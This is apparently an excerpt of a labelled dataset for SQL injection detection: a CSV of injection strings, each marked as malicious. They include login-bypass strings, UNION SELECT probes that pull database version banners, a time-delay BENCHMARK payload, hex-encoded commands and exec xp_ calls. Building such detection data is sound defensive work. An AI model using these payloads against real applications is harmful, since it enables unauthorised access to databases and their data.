row_index,payload_norm,label,sqli_type_hint
750,"select * from users where id = '1' or ( \ ) = 1 union select 1,@@VERSION -- 1'",1,
751,order by,1,
752,select * from users where id = 1 or !<@ or 1 = 1 -- 1,1,
753,or username is not NULL or username = ',1,
754,admin' or '1' = '1'/*,1,
755,//*,1,
756,"select * from users where id = 1 or ( \+ ) = 1 union select 1,@@VERSION -- 1",1,
757,"select * from users where id = 1 <@. union select version ( ) ,version ( ) -- 1",1,
758,"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1,
759,"select * from users where id = '1' + ( \. ) union select 1,@@VERSION -- 1'",1,
760,"<>""'%; ) ( &+",1,
761,and 1 = 0 ) union all,1,
762,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1,
763,"select * from users where id = 1 union select 1 $$,version ( ) -- 1",1,
764,"select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,
765,( sqlvuln ),1,
766,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1,
767,"select * from users where id = '1' + @ 1! union select 1,version ( ) -- 1'",1,
768,"select * from users where id = '1' union select ""[""_,version ( ) -- 1'",1,
769,"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1,
770,"select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",1,
771,"select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",1,
772,"select * from users where id = 1 or "",?"" or 1 = 1 -- 1",1,
773,1 exec sp_ ( or exec xp_ ),1,
774,"select * from users where id = '1' or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,
775,"""a"""" or 3 = 3--""",1,
776,admin' --,1,
777,select * from users where id = 1 +1 or 1 = 1 -- 1,1,
778,having,1,
779,") ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
